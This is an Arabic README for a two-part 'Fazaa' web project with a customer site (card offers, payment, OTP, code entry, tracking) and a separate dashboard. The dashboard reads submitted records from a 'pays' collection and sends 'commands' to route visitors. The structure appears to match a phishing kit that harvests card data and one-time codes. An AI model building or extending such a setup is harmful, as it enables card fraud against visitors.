# مشروع فزعة (FAZAA)

مشروع متكامل من جزأين مستقلين، كلاهما يتصل بمشروع Firebase المشترك `fazaa-e035d` عبر Cloud Firestore فقط (بدون RTDB).

## المكونات

| الجزء | المجلد | الوصف |
|---|---|---|
| موقع العملاء | `customer-site/` | واجهة الزائر: الرئيسية + البطاقات + الطلب + الدفع + OTP + التتبع (radar) + التسجيل |
| لوحة التحكم | `dashboard/` | لوحة إدارة مستقلة كلياً: قراءة الطلبات من `pays` + إدارة القرارات + المنتجات |

## روابط المعاينة الحالية

- **موقع العملاء**: https://work-1-ygrntibgdrmlbpdn.prod-runtime.all-hands.dev/ (منفذ 12000)
- **لوحة التحكم**: https://work-2-ygrntibgdrmlbpdn.prod-runtime.all-hands.dev/ (منفذ 12001)

## التشغيل محلياً

```bash
# الخادم (Node.js متوفر)
node server.js <المجلد> <المنفذ>

# مثال:
node server.js customer-site 12000
node server.js dashboard 12001 --spa-fallback
```

الخادم يدعم:
- ملفات ثابتة (HTML/JS/CSS/صور)
- ملف `_redirects` بنمط Netlify (إعادة كتابة داخلية لـ status 200)
- مسارات أذكى مثل `/request` → `request.html`، `/order` → `order.html`
- `--spa-fallback` لإرجاع index.html لأي مسار غير موجود (لللوحة)

## المسارات الرئيسية في موقع العملاء

| المسار | الملف |
|---|---|
| `/` | index.html (الرئيسية) |
| `/request?card=...` | request.html |
| `/cards?brand=...` | cards.html |
| `/order?brand=...` | order.html |
| `/payment` | payment.html |
| `/otp` | otp.html |
| `/code` | code.html |
| `/radar` | radar.html |
| `/register` | register.html |
| `/admin` | admin.html (نسخة لوحة قديمة داخل الموقع) |
| `/order-firebase.html` | نموذج طلب تفاعلي كامل يحفظ مباشرة في Firebase |

## قاعدة بيانات Firebase

- مشروع: `fazaa-e035d`
- المجموعات: `pays` (الطلبات)، `commands` (التوجيه)، `products` (الحزم)
- موقع العملاء يكتب في `pays` ولوحة التحكم تقرأ وتحدّث نفس الوثائق
- تفاصيل القواعد وخطوات الإعداد: انظر `dashboard/README.md`